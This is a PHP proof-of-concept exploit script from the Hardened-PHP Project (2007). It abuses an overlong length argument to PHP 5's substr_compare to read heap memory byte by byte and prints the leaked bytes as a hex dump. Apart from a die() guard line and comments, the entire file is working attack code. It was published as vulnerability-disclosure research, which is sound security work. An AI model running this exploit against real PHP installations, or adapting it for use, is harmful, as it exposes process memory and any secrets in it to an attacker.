<?php
  ////////////////////////////////////////////////////////////////////////
  //  _  _                _                     _       ___  _  _  ___  //
  // | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \| || || _ \ //
  // | __ |/ _` || '_|/ _` |/ -_)| ' \ / -_)/ _` ||___||  _/| __ ||  _/ //
  // |_||_|\__,_||_|  \__,_|\___||_||_|\___|\__,_|     |_|  |_||_||_|   //
  //                                                                    //
  //         Proof of concept code from the Hardened-PHP Project        //
  //                   (C) Copyright 2007 Stefan Esser                  //
  //                                                                    //
  ////////////////////////////////////////////////////////////////////////
  //        PHP 5 - substr_compare Information Leak Vulnerability       //
  ////////////////////////////////////////////////////////////////////////

  // This is meant as a protection against remote file inclusion.
  die("REMOVE THIS LINE");

  $sizeofHashtable = 39;
  $maxlong = 0x7fffffff;
  if (is_int($maxlong+1)) {
    $sizeofHashtable = 67;
    $maxlong = 0x7fffffffffffffff;
  }

  $memdump = str_repeat("A", 4096);
  for ($i=0; $i<40; $i++) $d[] = array();
  unset($d[20]);
  $x = str_repeat("A", $sizeofHashtable);
  
  // If the libc memcmp leaks the information use it
  // otherwise we only get a case insensitive memdump
  $b = substr_compare(chr(65),chr(0),0,1,false) != 65;

  for ($i=0; $i<4096; $i++) {
    $y = substr_compare($x, chr(0), $i+1, $maxlong, $b);
    $Y = substr_compare($x, chr(1), $i+1, $maxlong, $b);
    if ($y-$Y == 1 || $Y-$y==1){
      $y = chr($y);
      if ($b && strtoupper($y)!=$y) {
        if (substr_compare($x, $y, $i+1, $maxlong, false)==-1) {
          $y = strtoupper($y);
        }
      }
      $memdump[$i] = $y;
    } else {
      $memdump[$i] = chr(0);
    }
  }
  
  echo "memdump\n---------\n\n";
  
  for ($b=0; $b<strlen($memdump); $b+=16) {
    printf("%08x: ", $b);
    for ($i=0; $i<16; $i++) {
      printf ("%02x ", ord($memdump[$b+$i]));
    }
    for ($i=0; $i<16; $i++) {
      $c = ord($memdump[$b+$i]);
      if ($c >= 127 || $c < 32) {
        $c = ord(".");
      }
      printf ("%c", $c);
    }
    printf("\n");
  }

?>